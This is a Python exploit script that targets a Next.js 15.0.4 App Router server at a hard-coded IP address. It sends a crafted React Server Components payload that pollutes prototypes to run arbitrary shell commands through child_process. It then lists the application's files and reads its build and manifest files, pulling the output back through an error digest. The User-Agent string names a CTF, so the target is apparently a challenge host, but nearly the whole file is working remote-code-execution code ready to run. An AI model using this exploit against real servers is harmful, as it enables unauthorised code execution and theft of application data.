#!/usr/bin/env python3

from __future__ import annotations

import base64
import json
from pathlib import Path
from typing import Any

import requests


TARGET = "http://34.40.133.67:8080/"
OUTPUT_DIR = Path("old-web-raw")
OUTPUT_FILE = OUTPUT_DIR / "result.json"
MAX_RESPONSE_BYTES = 768 * 1024


def run_command(command: str, label: str) -> dict[str, Any]:
    encoded_command = json.dumps(command)
    prefix = (
        "var res=process.mainModule.require('child_process')"
        ".execFileSync('/bin/sh',['-c',"
        + encoded_command
        + "],{timeout:8000,maxBuffer:786432}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
    )

    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk, separators=(",", ":"))),
        "1": (None, '"$@0"'),
    }

    result: dict[str, Any] = {"label": label, "command": command}
    try:
        response = requests.post(
            TARGET,
            files=files,
            headers={
                "Next-Action": "x",
                "User-Agent": "Mozilla/5.0 (compatible; BushBash-CTF-build-inspection/1.0)",
                "Connection": "close",
            },
            timeout=(5, 15),
            allow_redirects=False,
        )
        body = response.content[:MAX_RESPONSE_BYTES]
        result.update(
            {
                "status": response.status_code,
                "headers": dict(response.headers),
                "body_length": len(response.content),
                "body_truncated": len(response.content) > len(body),
                "body_b64": base64.b64encode(body).decode("ascii"),
            }
        )
    except Exception as error:
        result["error"] = f"{type(error).__name__}: {error}"
    return result


def main() -> None:
    file_list = (
        "find /app -maxdepth 6 -type f ! -path '/app/node_modules/*' "
        "-printf '%p %s\\n' 2>/dev/null | sort"
    )

    selected_files = (
        "for f in "
        "/app/package.json "
        "/app/.next/server/app/page.js "
        "/app/.next/server/app-paths-manifest.json "
        "/app/.next/routes-manifest.json "
        "/app/.next/required-server-files.json "
        "/app/.next/server/server-reference-manifest.json "
        "/app/.next/server/middleware-manifest.json "
        "/app/.next/server/pages-manifest.json; do "
        "if [ -f \"$f\" ]; then printf '\\n===== %s =====\\n' \"$f\"; cat \"$f\"; fi; "
        "done"
    )

    results = {
        "target": TARGET,
        "framework": "Next.js 15.0.4 App Router",
        "tests": [
            run_command(file_list, "application_file_list"),
            run_command(selected_files, "selected_build_files"),
        ],
    }

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    OUTPUT_FILE.write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")


if __name__ == "__main__":
    main()
